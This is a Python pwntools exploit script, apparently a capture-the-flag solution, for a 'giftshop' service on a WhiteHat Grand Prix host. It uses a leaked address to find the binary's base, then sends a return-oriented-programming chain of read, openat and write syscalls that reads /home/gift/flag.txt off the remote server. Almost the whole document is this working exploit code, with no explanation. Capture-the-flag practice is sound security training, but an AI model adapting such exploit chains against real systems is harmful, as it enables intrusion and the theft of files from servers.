from pwn import *
import re
import time

context.log_level = "DEBUG"
context.arch='amd64'

HOST = "localhost"
PORT = 1337

HOST = "pwn01.grandprix.whitehatvn.com"
PORT = 26129

r = remote(HOST,PORT)
data = r.recvuntil("name plzz ??")

base = re.findall(r"0x[0-9a-f]+",data)[0]
base = base[2:]
base = int(base,16) - 0x2030d8
print hex(base)

r.sendline("1111") 
r.recvuntil("name plzz:")
r.sendline("2222")
r.recvuntil(" choice:")

#gdb.attach("giftshop", gdbscript="bp 0x55555555609C\nc")

payload = "1\x00"+"a"*22

FLAG_PATH = "/home/gift/flag.txt"
SYMLINK_PATH = "/home/gift/oqweqwe"
DATA_ADDR = 0x203200 + base 
FLAG_PATH_ADDR = DATA_ADDR
SYMLINK_PATH_ADDR = FLAG_PATH_ADDR + len(FLAG_PATH) + 1

#read(stdin, FLAG_PATH_ADDR, bignum)
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_read)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x0) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(FLAG_PATH_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(len(FLAG_PATH)+1)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#openat(100, FLAG_PATH_ADDR, 0)
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_openat)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x100) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(FLAG_PATH_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x0)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#read(6, DATA_ADR, 0x9999) 
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_read)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x4) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(DATA_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x9999)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#write(1, DATA_ADR, 0x1000) 
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_write)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x1) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(DATA_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x100)
payload += p64(0x0000000000002254 + base) # syscall; ret;


r.send(payload+"\n")
r.send(FLAG_PATH+"\x00")
#time.sleep(1)

print r.recv()
print r.recv()

r.close()
